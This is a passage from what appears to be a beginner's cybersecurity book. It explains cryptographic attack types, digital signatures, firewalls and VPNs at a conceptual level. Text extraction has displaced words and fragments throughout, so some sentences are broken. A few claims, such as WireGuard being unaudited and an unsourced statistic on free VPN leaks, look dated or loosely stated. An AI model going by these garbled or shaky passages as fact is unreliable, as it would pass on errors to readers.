assumption  regarding  any  security environment is that the attacker knows the encryption algorithm.  the   The accessibility of the ciphertext  Once  the  encryption  of  the  plaintext  is  transformed  into ciphertext,  it  is  then  transmitted  through  an  unsecured  public channel.  Therefore,  the  attacker  can  evidently  assume  that  it has  access  the cryptosystem.  The  accessibility  of  the  ciphertext  is  the  second assumption from the attacker.  the  generated  ciphertext   through   to   The  accessibility  of  plaintext  and  ciphertext Although  this  third  assumption  isn’t  observable  as  the previous  one,  however,  in  certain  situations,  the  attacker  can have  access  to  both  the  plaintext  and  its  corresponding ciphertext. This is possible in situations such as:  The attacker persuades the sender to alter or transform the  plaintext  in  a  format  of  his  choice  before  getting  the ciphertext from him.  The receiver may accidentally reveal the content of the plaintext  to  the  attacker.  In  turn,  the  attacker  has  the equivalent  ciphertext,  which  is  gotten  through  an  open channel  The encryption key in a public cryptosystem is available in  an  open  domain,  and  any  potential  attacker  may  know   the  key.  With  this  key,  the  attacker  can  generate  the corresponding plaintext and ciphertext.  Cryptographic Attacks Before  looking  at  the  benefits  and  drawbacks  of  cryptography, you must know that the primary intention of an attacker or hacker is to break a cryptosystem in order to gain access to the plaintext from the ciphertext. All the attackers need in order to get the plaintext is to find the particular secret decryption key.  This makes the attacker apply every knowledge he has to find out that particular secret key used in that cryptosystem. The moment he can  do  that,  then  such  a  system  can  be  considered  compromised, broken, or hacked. Based on this, there are various attacks that can be performed on a system, and I have helped you to categorize them in a simple way to know what particular attack you may be facing.    Ciphertext only attacks  In this particular attack, the attacker or hacker has access to a  group  of  ciphertext   s .  However,  he  doesn’t  have  access  to the  ciphertext  corresponding  plaintext.  This  particular  attack  is only  successful  when  the  attacker  can  get  the  corresponding plaintext from the given ciphertext  s . Most modern systems are protected against this form of attack.  Known Plaintext attack  In  this  particular  strategy,  the  attacker  has  access  to  the plaintext  of  some  part  of  the  ciphertext.  The  main  job  in  this attack is for the attacker to decrypt the remaining ciphertext from the  information  he  has  gathered.    A  common  example  of  the “known  plaintext  attack”  is  linear  cryptanalysis  against  block ciphers.         Dictionary attack  There are many variations to this type of attack, but they all involve  gathering  a  “dictionary.”  The  attackers  use  a  simple method  of  building  a  dictionary  of  ciphertext  along  with  its plaintext, which they may have learned over a long time. In the future, once the attacker gets access to the ciphertext, he looks through the dictionary he has created to find any corresponding plaintext.     Brute force attack  During  this  attack,  the  attacker  does  everything  possible  to the  secret  key  by  using  every  possible  key. determine  Peradventure the length of the secret key is 8 bit, and then the likely number of keys will be 28, which is equivalent to 256. With the  ciphertext  and  algorithm  known  to  the  attacker,  he  tries every  possible  256  keys  for  the  decryption.  However,  the  time taken  by  the  attacker  to  complete  this  attack  is  very  high because he has to try every single key.  Man in the Middle Attack  The  primary  focus  of  the  attackers  in  this  attack  is  mostly public key cryptosystems, especially in areas where keys must be  exchanged  before  communication  can  occur.  For  instance, host X wants to transmit a message to host Y, thereby request for  the  public  key  of  host  Y.  then  the  attacker  intercepts  this request  from  host  X  and  sends  the  key  instead  of  host  Y sending  it.  Due  to  this,  whatever  host  X  sends  to  host  Y,  the attacker has access to read it. To maintain the communication process going between the two hosts, the attacker re-encrypts the  information  after  reading  it  and  resend  it  to  host  Y.  the attackers send his personal public keys as the key from host X in order to deceive host Y that the message is coming from host X.   Cryptography Digital Signature Have you ever signed a document physically? Do you know the importance and implication of your action? I am sure you understand if it is a matter of life and death. Well, a digital signature is like your handwritten  signatures  or  typed  messages,  which  is  a  binding signatory  to  that  message  or  document.  It  is  a  technique,  which binds an entity person to digital data or information. Both the receiver and any third party can independently verify this binding.  In  the  physical  world,  when  we  sign  documents,  it  is  a  sign  of assurance  that  such  a  message  is  from  the  sender,  and  there shouldn’t be any repudiation of the original message. In the case of a digital signature, the signer only knows the secret key.  The model of the digital signature system is based on public-key cryptography,  and  the  diagram  below  shows  the  entire  process involved.    The  following  is  an  explanation  of  what  goes  on  in  the  entire  process:    Each  individual  implementing  the  digital  signature  has  his or her own pair of the public or private key  Normally,   the  keys  used   the  encryption  and decryption process is different from that use in the signing and  verification  process.  The  signature  key  is  the  private key whereas the verification key is the public key  for    The  signer  provides  data  to  the  hash  function  before  generating a hash of data  The signature key and hash value are then sent to the signature  algorithm,  which  the  digital signature  based  on  the  given  hash.  Furthermore,  the signature is appended to the information before sending it to the verifier.  then  generates   The  verifier  then  feeds  the  verification  key  and  digital signature  to  the  verification  algorithm,  which  generates some values as an output  Additionally,  the  verifier  runs  the  same  hash  function  from the data received to produce the hash value  In  order  to  ascertain  that  the  digital  signature  is  valid, the  verifier  then  compare  the  output  of  the  verification algorithm with the hash value        The importance of Cryptography Digital  Signature Of all cryptographic primitives we have, the digital signature through  public-key  cryptography  the  most  useful  and significant  tool  to  provide  information  security  in  this  world. Besides its capability of hindering the reproduction of messages, it further provides data integrity and message authentication. Let us  look  at  the  important  role  that  digital  signature  plays  in information security.  is   Data integrity – peradventure the attacker has access to the information and alters anything, at the receiver’s end; the digital signature verification will fail. This is because the output from the verification algorithm and the hash modified information  will  not  match.  Therefore,  the  receiver  can safely reject the message, citing a breach of data integrity.   Message  authentication  –  Once   the  verifiers authenticate  the  digital  signature  through  the  sender’s public key, the verifier is assured that the sender, who has access  to  the  equivalent  secret  private  key,  created  the signature.  Therefore,  the  key  is  between  the  sender  and receiver without any third parties involved.  Non-repudiation  –  Based  on  the  assumption  besides the  signer  no  other  person  has  the  signature  key,  the sender  can  generate  a  unique  signature  on  a  set  of  data. With  this,  the  receiver  has  evidence  of  the  present  data along with the digital signature if there is any issue that may arise in the future.     Benefits, challenges and The Future of  Cryptography in Information Security  In  conclusion,  to  this  chapter,  it  is  important  to  explore  the benefits of cryptography along with its challenges. Currently, we are interconnected with information now in its digital form of bytes and bits.  Relevant  and  critical  information  must  be  protected  from criminals.  They  must  be  stored,  processed,  and  transferred  in  a digital format through various communication channels. Considering the fact that information plays an important role in national security, intruders  or  attackers  are  targeting  any  open  communication channels and computer systems to either interrupt the flow of critical information or steal sensitive information from innocent users.  However,  with  the  advent  of  technology,  various  cryptography techniques  have  been  a  provider  to  guarantee  that  the  malicious objectives of these cybercriminals are not only thwarted but ensuring that only authorized users have access to this information. Without further ado, let us look at the benefits, limitations, and the future of cryptography in information security.   Benefits of Cryptography An essential tool for information security is cryptography, and no one can dispute that fact. However, it provides four basic benefits to information security. These include:    Confidentiality – Through cryptography, we can protect various information from unauthorized users and access to this information  Authentication  –  Through  various  cryptography techniques  such  as  digital  signatures  and  MAC,  we  can protect our information from forgeries and spoofing  Non-repudiation  –  It  provides  the  services  of  non- repudiation  in  order  to  protect  against  any  dispute,  which may  come  up  because  of  denial  of  transmitting  the message  Data  integrity  –  The  hash  functions  of  cryptography helps in assuring the users concerning the data integrity of the information  Drawbacks of Cryptography In  spite  of  the  widespread  acceptance  of  cryptography  in  the information  security  industry,  it  does  have  certain  drawbacks  that have  affected  the  effective  usage  of  information.  These  issues include:    It can be difficult for even a legitimate user to access an authentic,  encrypted,  and  digitally  signed  information  at  a decision making period. An intruder can attack or render the computer system or network non-functional  The  high  cost  of  cryptography  in  terms  of  money  and  time is a major issue confronting information security.  It  doesn’t  protect  against  threats  and  vulnerabilities, which may emerge because of the poor design of systems, procedures, and protocols.   The Future of Cryptography Technology  will  control  to  improve,  and  this  has  brought  about elliptic  curve  cryptography;  although  it  has  its  own  benefits  and drawback,  which  hasn’t  been  fully  understood.  Notwithstanding, Elliptic  Curve  Cryptography  allows  users  to  perform  the  encryption and  decryption  process  in  lesser  time,  thereby  allowing  a  high volume  of  data  to  be  transmitted  with  equal  security.  While  elliptic curve cryptography is still new, there is a need to test and prove its security  before  for  private, it  can  be  accepted  commercial, and governmental purposes.  to  be  used   Another new phenomenon is quantum computation. In as much as  the  data  of  modern  computers  are  stores  in  a  bit,  a  quantum computer  stores  its  data  via  a  quantum  superposition  of  multiple states. There are indications that modern cryptography will explore harder computational problems or perhaps devise new strategies of archiving the objectives as presented today.   Chapter 8: Firewalls  Introduction If  you  were  to  ask  any  cybersecurity  expert,  if  the  internet  is  a scary  place,  9  out  of  10  will  agree  to  it.  Hackers  or  cybercriminals have the capability of hiding their identity while attempting to intrude into people’s computers to access their personal information with the intention of using it for their personal gain.  To  complicate  matters,  assuming  your  operating  system  or software has a security hole, which isn’t fixed quickly, this could lead to someone hacking into your computer without you noticing. What do you do in such a situation? Does it mean you have to stop using the  internet?  Is  there  a  way  of  protecting  yourself  against  such unauthorized intrusion to your privacy?  Amazedly, you can do something quickly to protect yourself. With firewalls,  you  can  protect  yourself  without  any  external  intrusion. Previously,  firewalls  were  “hotcakes,”  which  is  only  used  by  big companies because they are expensive pieces of hardware. During those days, not many people use the internet. However, if they did, they  were  using  a  dial-up  connection,  which  isn’t  fast  enough. Because  of  large bandwidth.  target  companies  with   this,  most  hackers   Today, virtually everyone is connected to the internet with cheap and fast internet speed. Hackers have taken their game to both big companies  and  home  users,  especially  those  improperly  secured. However,  before  going  further,  it  is  important  to  understand  what firewall entails along with its distinct features.  What is a Firewall? A  firewall  can  be  a  software  application  or  hardware  device, which  acts  as  a  bodyguard  between  your  internet  and  your computer.  It  shields  every  “internet  traffic,”  which  you  have  not   requested  from  having  access  to  your  computer.  This  is  a  simple analogy,  but  that  is  what  a  firewall  does.  In  simple  terms,  let  us assume you browse to xyz website, the firewall will allow the traffic from the “xyz” website to gain access to your computer. However, if you  didn’t  request  to  visit  the  xyz  website  and  the  site  now  sent traffic  to  your  system,  the  firewall  will  not  allow  it  to  access  your computer.  Notwithstanding,  these  characteristics  exhibited  can  be changed.  Don’t  get  it  confused  when  I  said  firewall  could  be  a  software application or hardware device; here lies the difference. A hardware firewall  device  sits  within  your  internet  connection  while  the  other part is connected to your computer. Most of these firewalls have an inbuilt  hub,  which  enables  you  to  connect  multiple  computers  for sharing a single internet connection.  The  firewalls  use  a  technology  known  as  Network  Address Translation to provide the required protection to all computers, which is connected to it. The protected computers performed this protection through  private  IP  addresses,  which  initially  isn’t  reachable  via  the internet.  Additionally,  IP addresses into a single public IP address, which is then assigned to your  firewall.  With  this,  your  hardware  firewall  can  accept  every incoming  request  and  later  forward  them  to  your  internal  computer request.  firewall  converts   internal   these   the   On  the  other  hand,  a  personal  firewall  is  a  software,  which  is installed  on  the  computer  you  want  to  be  protected.  What  the software  does  is  to  filters  both  incoming  and  outgoing  traffic,  and allows  only  data,  which  you  have  personally  requested.  Unlike  the hardware  firewalls,  personal  firewalls  have  more  features  even though  they  lack  the  benefit  of  allowing  you  share  your  internet connection with various computers on a single network.  Perhaps,  you  are  thinking,  which  one  is  best  suited  for  your protection?  Well,  that  decision  will  depend  on  various  factors. However,  if  you  want  to  protect  only  a  single  computer,  the  best option will be a personal firewall else you better go for a hardware   firewall  if  you  want  to  protect  multiple  computers.  Additionally,  the hardware firewall wall will be cost-effective when protecting multiple computers.  You  can  also  combine  both  pieces  of  device  to  protect your computer. You should consider this as it might be a good idea to  safeguard  your  information,  especially  if  you  are  looking  for  an additional level of security.  Important Features of Firewall In  choosing  a  particular  firewall  to  use,  it  is  imperative  to  pay special  attention  to  their  features.  This  can  make  a  big  difference regarding how your computer is protected against external access. In  as  much  as  these  features  will  differ  from  one  individual  to another,  I  have  rounded  up  the  most  important  features  to  check when  considering  buying  a  firewall.  Notwithstanding,  in  terms  of security,  your  focus  should  be  on  features  such  as  application protection,  stealth  mode,  notifications,  inbound,  and  outbound filtering. Let us look at each feature individually to give you a glimpse of how important they are.    Inbound and Outbound Filtering  This  feature  is  unique  because  it  helps  determine  the information  allowed  or  disallowed.  The  primary  function  of  a firewall  is  to  allow  and  discard  information  based  on  certain criteria  or  rules  created.  It  does  this  task  to  handle  all  your security  issues.  Most  people  think  that  inbound  filtering  is  the primary  function  of  a  firewall,  but  they  are  wrong.  Inbound filtering  is  the  process  of  filtering  incoming  data  towards  your computer.     Stealth Mode  Significantly, your firewall must not just block requests from reaching the computer. It must also appear as if it doesn’t exist on the internet. You are in a stealth mode when your computer            even  though  connected  to  the  internet  cannot  be  detected. Today, hackers have the capabilities of detecting if a particular computer is on the internet by using special data to probe the computer.  However,  if  you  are  in  a  stealth  mode,  the  firewall doesn’t return this information to the hackers, thereby making it look  like  you  are  offline.  Because  of  this,  hackers  will  stop targeting your computer because to them you are offline.  Privacy Protection  Protecting  your  privacy  is  essential,  and  you  won’t  want  to jeopardize that for anything. Most firewalls today have the ability to block adware, hijackers, and spyware from having access to your  computer.  The  privacy  protection  feature  enables  you  to protect  your  computer  infection  especially  with software that reveals private information of users.  from  any   Application Integrity  This  feature  enables  the  firewall  to  monitor  files  on  your computer  for  issues  of  modification  or  how  these  files  are launched.  Once  the  firewall  detects  any  change,  it  notifies  the users  and  denials  the  application  from  running  or  transmitting data  to  the  internet.  Most  times,  these  file  modifications  may appear  like  an  upgrade;  however,  a  malicious  program  may have triggered this modification.  Intrusion Detection  Criminals, intruders, or hackers use various means to hijack your computer security. However, the intrusion detection feature scans  all  incoming  data  for  signatures  of  known  methods. Furthermore,  it  notifies  you  when  it  has  recognized  any  such            attacks. Interestingly, with a firewall, you can know the method by which a hacker or intruder wants to hack your computer.  Notifications  With this feature, you can know the particular activity going on  the  firewall,  because  it  has  several  means  of  notifying  you about any likely penetration or intrusion to your computer. Popular Firewalls Due to the widespread security threats in cyberspace, the market is  flooded  with  various  kinds  of  firewalls.  These  different  firewalls have  their  strengths  and  weaknesses.  However,  the  following  are some personal firewalls you could try:    Zone Alarm Free Outpost Firewall Emsisoft Online Armor Free  Commercial personal firewalls  Zone Alarm pro plus Outpost Firewall Pro McAfee Personal Firewalls  Hardware Router or Firewalls vendors  NETGEAR Linksys D-Link Belkin   Conclusion The importance of getting a firewall to protect your computer isn’t one  to  be  taken  for  granted.  With  a  firewall,  you  protect  yourself against  hackers  and  viruses.  Furthermore,  when  you  integrate  a proper  rule  and  monitoring  process,  you  will  use  your  computer confidently  without  any  fear  of  external  threats  from  anyone.  You never  leave  your  home  unlocked  in  a  crime  dominated  area.  You always  lock  it  to  prevent  intruders  and  robbers  from  taking  your valuables. Why leave your computer open to hackers when you can protect your files and important information through firewalls.   Chapter 9: Virtual Private Network  Introduction With  the  continuous  bombardment  of  online  privacy  and  the constant  alarming  security  threat,  many  are  confronted  with,  the number of people turning to VPN services is on the rise. For those who may be hearing VPN for the first time, it may seem complicated to use but that is not the case because, in this chapter, I am going to demystify  them,  explain  everything  you  can  use  them  for,  why  you should consider using them and how to make them work effectively to your advantage. Additionally, I will make some recommendations to help you if you decide to pick a VPN for yourself.  VPN also is known as Virtual private network is the decisive tool to get the best out of your online freedom and privacy, especially if you  spend  most  of  your  time  online.  Having  a  good  VPN  is  non- negotiable because it allows you to:    Secure  your  devices  from  attacks,  hackers,  and  the  increased threats of public wireless networks  Restore  your  privacy  through  the  encryption  of  your internet traffic, which makes it hard for third parties such as surveillances  agencies,  network  admin  and  internet providers to read your information  Appear  everywhere  in  the  world  by  exchanging  your  location and IP address using the VPN server  Unblock  any  restricted  content  irrespective  of  your  location  Besides privacy and security concerns, the two factors that drive the  usage  of  VPN  are  blocked  websites  and  content  restrictions. From China to the United States to North American, the number of people depending on the use of VPN to have a private, secure, safe, and  unrestricted  experience  online  is  constantly  on  the  rise.  Why   allow  your  important  information  stolen  or  compromised  when  you have what you need to safeguard yourself. Your information security lies in your hands.  What Is a VPN? VPN is an acronym for the virtual private network and a service that  allows  or  enables  you  to  have  access  to  the  internet  privately and safely without any compromise to your information. Furthermore, it allows you to get through restricted contents, which naturally you may not have access to using your normal internet connection. With the VPN, you route your connection via a server that allows you to hide your online activities.  There are some basic terms I want you to understand before we dive  deeper  into  the  VPN.  With  these  terms,  you  can  easily understand  certain  things  I  will  explain  in  the  latter  part  of  this chapter.    VPN  Client  –  This  represents  the  software  that  links your  device computer  to  the  VPN  service.  At  times,  the “VPN app” and “VPN client” are used consecutively.  VPN Server – This represents a single endpoint in the VPN network where the connection and encryption of your internet traffic takes place  VPN Protocol – This represents the method used by a device  to  successful  create  a  secured  connection  to  the VPN server.  VPN  Service  –  This  represents  an  entity,  which  offers you the capability of using their VPN network. Besides this service,  they  provide  VPN  software  to  clients.  To  access these  services,  clients  must  be  subscribed  their packages.  VPN  providers  and  VPN  services  are  used interchangeably.  to   How Does VPN Work?   With the strong foundation you have received, it is time to dive into the working principle of a VPN. It is not enough to just subscribe to a VPN service and neglect how it works. Once, you know how it works,  you  can  avoid  any  loopholes  you  may  intentionally  or accidentally open to your attackers or cybercriminals.  VPN uses a simple operation to provide the services you need by encrypting your connection between your computer system and the server. You can consider this encrypted connection to be a protected tunnel that allows you to access everything online while appearing in the  location  of  the  VPN  server  that  you  are  connected  to.  For instance,  you  may  be  in  the  United  States  and  appear  to  be connected  online  in  China.  The  VPN  server  protects  your  location and  uses  its  server  position  as  yours.  This  gives  you  additional security, a high level of online anonymity, and unrestricted access to the internet irrespective of your location.  From the diagram above, you can see how VPN works. It is hard for  hackers  or  government  agencies  to  monitor  and  restrict  your activities. The tunnel serves as your VPN that protects your online presence and privacy. Does that sound interesting? Well, let’s look at another scenario where there is no VPN used.   What  can  you  say  about  this  second  image?  Does  it  look familiar? Of course, it is what people who don’t use VPN go through. The  internet  comprises  of  servers  with  the  responsibility  of  storing websites  and  allowing  anyone  who  wants  to  view  them.  These servers  communicate  with  one  another  and  share  important information, including your bank details, security number, etc.  It is great to share and surf online but not good news for your privacy.  When you go online, it is like you boarding a commercial flight. The security personnel, baggage handlers, flight attendants, and the ticket agent will need your data to be able to route you to your city. Something  similar  happens  on  the  internet,  your  information  goes through various servers. If you are just browsing the internet simply for the fun of it, then you shouldn’t border about anyone seeing your information.  However,  if  it  has  to  do  with  business  email,  online banking,  or  anything  sensitive,  the  story  is  very  different.  Without using  a  VPN,  all  your  online  activity  is  traceable  to  your  physical location.  Besides  this,  your  device  exposes  your  IP  address.  Each computer system or device that you use in connecting to the internet has its own distinct address.  However, with a VPN, you can hide your primary location and use that of the VPN server to protect yourself against cybercriminals who are  on  the  rise.  Most  VPN  service  providers  maintain  their  servers   throughout  the  world.  This  gives  users  unlimited  connection  and unrestricted  content  all  round  the  world.  You  need  to  buy  or subscribe to these services before these unlimited possibilities can be  achieved.  Once  you  buy  and  download  the  software  to  your computer or device, you can connect to anywhere instantly.   Why Use VPN Services? I know this question will arise in your mind at one point. Why is it that people are using VPN services throughout the world more than ever before? Well, this depends on their situation; however, there are certain  situations  that  necessitate  the  use  of  VPN  services.  These are not limited to the ones I will mention here.    Accessing the internet without revealing their location or authenticate  IP  address.  You  can  attribute  this  to  online anonymity  Get unrestricted access to certain websites and content from  people  or  country  with  restrictions  because  of  their location  Providing  an  additional  level  of  security  through  the  encryption of their internet connection  Bypass censorship by easily getting access to regional  restrictions  Prevent  network  admins,  third  parties,  government agencies, and their internet service provider from spying the activities online  Protect  and  hider  their  sensitive  private  data  including photos,  credit  cards,  bank  passwords,  and  other  relevant information  Access  the  internet  without  any  fear  of  attack  or  compromise  Protection  against  cybercriminals  or  hackers  especially when  they  are  using  public  Wi-Fi  connections  in  airports, hotels, and cafes  To  stream  media,  P2P  download  and  perform  torrent  activities  Do you still doubt the use of a VPN for your internet connection? So far, you have learned what VPN is, how it works, why you use them. It is important to clear the doubt concerning how safe they are when used.   How Safe is VPN Today, VPN security is causing a strong debate among various IT professionals. However, it is important to note that no two services can be identical in terms of its security or what it offers. In view of that, once you can confidently say that VPN is safe to use for your internet and information security if it is a high-quality VPN.    Notwithstanding, it doesn’t mean that there are no flaws. Today, there are over 350 VPNs on the market with the increasing number if you  consider  the  free  VPN  apps  we  have  in  the  Google  Play  and Apple stores. Regrettably, these VPNs with free services have bugs, flaws, and poses huge security and privacy threat to your personal information. However, to protect your data and keep you safe from any leak to your information and device, it is important to choose a high-quality VPN.  If possible, you should avoid using any free VPN app or services because  recent  studies  have  discovered  that  about  84%  of  users’ data leak arises from free Android VPN apps. In as much as most people have come to terms that these apps should be avoided, there are  countless  millions  using  them  for  various  activities.  There  are various reasons why you should avoid using free VPNs if you want to take your online security seriously. These include:      You give third parties access to your sensitive data Traffic leaks such as DNS and IP address leaks Stolen bandwidth Hidden tracking of your activities Embedded malware, which is common with free VPN Fraud including financial and identity theft Browser hijacking  Importantly, be on the watch for various VPN scams ranging from fake  reviews,  bogus  features  to  lifetime  VPN  subscriptions.  As  a standard rule, when you subscribe to a VPN service, you should get what you are paying for.  Are VPN Services Legal? The answer to this question will vary depending on what part of the  world  you  live  in.  Well,  in  the  Western  world,  it  is  legal  to  use VPN  services  as  long  as  they  are  for  security  and  online  privacy. Actually,  most  businesses  use  VPN  daily  and  I  don’t  see  this changing anytime soon.    Nevertheless,  there  are  countries  such  as  Saudi  Arabia,  the United  Arab  Emirates,  Iran,  Iraq,  North  Korea,  Oman,  Russian, Belarus, and Turkmenistan that don’t allow the use of VPN services. These  countries  frown  at  the  use  of  such  services  because  it empowers the users to have access to everything possible online.   For  instance,  in  China,  the  government  has  fortified  its  “Great Firewall”  with  the  aim  of  blocking  websites  and  VPNs. Notwithstanding, some internet users use certain VPN to get through these  issues.  Another  country  whose  measure  to  ban  the  use  of VPNs have failed is Russia because the VPN traffic is hidden and looks like a normal HTTPS traffic.  Importantly, VPN services are used routinely by businesses and private  individuals  throughout  the  world  for  their  network  security. Hence, it is unlikely for use to see an outright ban on the use of VPN considering their importance for private and business security.  them   for  various  purposes   If it is obvious that VPN services help to protect or hide one's IP address  and  location,  can’t  people  use  it  for  fraudulent  or  bad activities? Emphatically, yes! However, VPN is like steel because we can  use  transportation, buildings, and bridges. Additionally, its usage isn’t limited to these as we have seen the use of steel in making tanks, guns, and building bombs, which harm people. Contrasting the negative impact with its positive  influence,  are  we  to  say  that  the  ban  on  steel  will  yield  a better result? Obviously, not because that will be stupid and insane to do. It is like cutting your left leg because of a minor injury that you have.  including   The  same  holds  true  for  VPNs  and  encryption.  Businesses, banks, and different websites involved in the use of sensitive data, which must be encrypted and used for daily purposes. Irrespective of how  people  misuse  these  encryption  and  VPN  tools,  they  are needed for our online security and privacy.  Setting Up Virtual Private Network Your  online  security  and  privacy  are  a  priority  for  me,  which  is why  in  this  section,  I  want  to  enlighten  you  on  the  easiest  way  of setting up your VPN. However, the particular instructions for setting it up  may  vary  depending  on  the  device  or  system  you  are  using. Another  factor  is  the  particular  VPN  service  you  may  be  using. Notwithstanding,  the  installation  procedure  in  this  book  is  what  is   recommended  by  most  VPN  providers  for  most  devices  and operating systems.  The following is a general overview of how to effectively set up  your VPN.    Select a good and reliable VPN provider Subscribe to its package then download the software to  your device or operating system  Use  the  credentials  provided  after  subscription  to  log  Connect to the server of your choice then you can enjoy  into the VPN  your online privacy  Users  of  the  following  platforms  iOS,  Android,  Mac  OS,  and Windows  have  the  option  to  use  the  inbuilt  VPN  capability  of  their operating  system.  Instead  of  the  OpenVPN,  these  systems  use IPSec L2TP  or  IPSec IKEv2  protocols.  Although  this  may  be  less costly; however, to enjoy all features and avoid any data leak when online, it is advisable to use a VPN service for your online security and privacy.  The Role of VPN for Online Privacy Undoubtedly, VPN provides both security and online privacy. As already  indicated,  without  any  VPN  for  your  device,  your  internet service  provider,  or  cybercriminals  can  monitor  and  record  your online  activities  easily.  This  could  range  from  your  social  media interactions with friends and families, comments you make, websites you  visit,  your  preferences,  etc.,  today,  we  have  various  privacy violations where government or agencies require an internet service provider  to  provide  the  logs  of  users  browsing  and  data  activities. Therefore, with a VPN, all your internet service providers see is that you  are  online  with  your  device  connected  to  a  VPN  server. However,  your  data  is  secured  and  encrypted  without  third  parties having the ability to read your information.   Furthermore, the role of VPN for your online security cannot be underplayed  because  VPN  when  connected  to  a  public  WiFi,  you expose yourself and because a prey for hackers to steal your credit cards,  identity,  password,  and  bank  accounts,  etc.  Without  a  VPN, you  single  yourself  out  for  possible  attacks.  If  you  want  to  prevent and protect your data from hackers and third parties, it behooves you to consider using a VPN service to encrypt your data.   What About the Issue of Being Anonymous Another issue to clarify is that because you use a VPN for your online security and privacy doesn’t mean you are 100% anonymous. Actually, considering the number of surveillance agencies including NSA, it is hard to actualize a 100 percent online anonymity.  This  shouldn’t  deter  you  from  using  a  VPN  because  there  are steps  to  implement  to  help  increase  your  online  anonymity.  These steps go beyond using the best VPN service. For a start, you can:    Use  a  secured  browser,  which  safeguards  you  against  browser fingerprinting  Use  a  reliable  ad  blocker  because  some  adverts  can disguise in tracking your online activities, profiling you, and collecting  information  without  your knowledge  relevant  personal   Another issue to consider is VPN logs. Paying close attention to your logging policies and logs is very important as it concerns your online privacy. When using a VPN, you must understand that these logs are of various types, which include:    Connection  logs  –  These  include  times,  dates,  IP addresses,  and  connection  data.  Normally,  the  connection data is useful in improving the VPN network and potentially dealing  with  any  user  challenges  that  arise.  What  to  note here is to read how these data are secured and how often they will be deleted.     Browsing log – They include virtually everything kind of activity  you  perform  online,  which  include  metadata,  IP addresses,  times,  browsing  the  history,  etc.  Peradventure you are using a free VPN, and then it is unlikely for you to maintain the usage of these logs.      No  logs  –  Most  VPNs  claim  they  provider  “no  logs.” Well,  from  my  research,  it  is  only  a  few  VPN  service providers that perform this function to their clients.  Performance and Speed of VPN There are numerous activities that happen when you use a VPN. Your computer or device is performing the encryption and decryption of data packets, which is then routed via a distant VPN server. These processes take resources, time, and affect the overall speed of your internet.  Therefore, to get the best out of your internet speed when using a VPN, it is essential to link up with the closest VPN server that suits your purpose. For instance, if you reside in Canada and want to gain access to blocked content, which is open for individuals in the United States, the best option will be to choose a server in New York rather than a server in California.  A good way to detect a quality VPN service provider is through your internet speed because the service shouldn’t have any impact on  your  internet  speed.  Alternatively,  if  you  use  a  low-quality  VPN service, it will considerably decrease your internet speed. What may lead to this is the overload of the server by different users.  In  spite  of  this,  you  have  a  role  in  helping  increase  your  VPN speed.  Ensure  you  patronize  a  reliable  VPN  provider  with  good performance. Additionally, you can connect to a nearby server that is less  congested.  If  these  aforementioned  options  solutions  doesn’t work,  then  you  should  consider  changing  your  VPN  protocols. Furthermore,  check  your  device,  your  network  and  internet  service provider because this can influence your internet speed.  VPN Protocols and Encryption In using a VPN, there are various VPN protocols offered by these service  providers.  However,  it  is  important  to  know  what  VPN protocol is all about. In a nonprofessional term, it is a sequence of   instructions  to  set  up  a  secure  and  encrypted  connection  between the  VPN  server  and  your  device  for  the  transfer  of  data.  The following are the common VPN protocol used in the world today:    OpenVPN  This  protocol  is  one  of  the  most  secure  and  popular protocols  used  for  different  types  of  devices.  it  is  an  open- source  project,  which  is  developed  for  multiple  types  of authentication  methods.  If  you  want  a  versatile  VPN  protocol that  is  usable  for  various  devices,  then  OpenVPN  is  a  perfect choice.  Besides  this,  it  offers  strong  encryption  and  excellent performance.  IKEv2 IPSec  fast  VPN  protocol.   IKEv2  is  an  acronym  for  Internet  Protocol  Security  with Internet  Key  Exchange  Version  2,  which  like  the  former  is  a secure  and  It  comes  automatically preconfigured  in  most  operating  systems  including  iOS,  Mac OS,  and  windows.  It  functions  perfectly  for  establishing  a  lost connection again. The drawback to this protocol is that it is not an open-source project because Microsoft and Cisco develop it. It is a perfect choice for people who use mobile devices.  This protocol is an old VPN protocol, which comes inbuilt in most operating systems. Also known as Point-to-Point Tunneling Protocol,  it  has  different  security  vulnerabilities,  which  has contributed to it not been considered safe for VPN activities.  PPTP  L2TP IPSec            This  is  also  a  decent  protocol  choice  for  anyone  to  make. Layer  2  Tunneling  Protocol  with  Internet  Protocol  is  much secured, unlike the PPTP. Furthermore, the speed isn’t that fast because  of  the  double  encapsulation  of  the  data  packets.  It comes  inbuilt  in  most  operating  systems  and  widely  used  in mobile devices.     WireGuard  This  protocol  is  new  in  the  industry  and  aims  at  better performance  and  improved  security  when  compared  to  the previous existing VPN protocols. It hasn’t been audited since it is still under active development. However, some VPN provider supports the use of it only for testing purposes.   VPN on iOS and Android Devices So  far,  you  know  that  VPNs  can  be  used  on  both  iOS  and Android devices. however, I want to explore the three different ways of using them on these devices.    Through Custom VPN apps  –  VPN  providers  provide custom VPN apps for their users for both iOS and Android devices,  which  are  normally  stable,  fast  with  different unique features.        Through Third-Party VPN apps – You can use various popular  free  third-party  VPN  apps  such  as  OpenVPN  for Android to protect your online privacy.  Inbuilt  VPN  functionality  –  Some  devices  come  with inbuilt VPN functionalities. For instance, iOS devices have IPSec IKEv2  whereas  Android  devices  have  IPSec L2TP functionality.  Although VPNs have significantly improved on Android and iOS devices, they can’t be compared to that of a computer system. The reason  behind  this  is  that  unlike  the  typical  VPN  applications,  a normal  VPN  is  more  complicated  and  requires  connections  to encryption,  decryption,  and  external  servers.  This  situation  is different from a mobile device, in which connections may be unstable  switch off and on overtime .  Using a VPN on a Router You can connect your VPN to a route but you must ensure that such route supports a VPN service. With a good router that supports VPN services, you can benefit the following:     Protect  your  home  network  against  cybercriminals,  spying, hacking, or any potential attack  Easily secure and protect yourself against your internet  service provider and any surveillance  Your  mobile  devices  can  benefit  from  such  service  without the installation of a software     However,  the  secret  to  getting  your  setup  correctly  begins  with selecting  a  reliable  VPN  provider  before  choosing  the  right  route. Once  this  is  sorted  out,  the  rest  is  history.  Notwithstanding,  the router’s processing power is a major factor to consider in the course of choosing a VPN router.  VPN Leaks In  spite  of  the  benefits  of  using  VPN  services  for  your  online privacy  and  security,  a  serious  issue  confronting  VPN  providers  is the challenge of data leaks. Data leaks come in various types with the primary intention of undermining your security and privacy when using  a  VPN  for  your  device  or  computer.  The  following  are  VPN leaks you may experience when using a VPN service:    IP  address  leaks  –  This  normally  means  that  your  IP address has leaked from the VPN tunnel, thereby exposing   your security and location. it can be temporary, short, or a continuous  leak  depending  when  you  discover  it.  The primary  culprit  is  normally  IPv6  addresses  that  use  VPN that doesn’t properly block or support IPv6  DNS  Leaks  –  This  usually  takes  place  when  DNS requests  leaks  from  the  VPN  tunnel  and  your  internet provider  begins  to  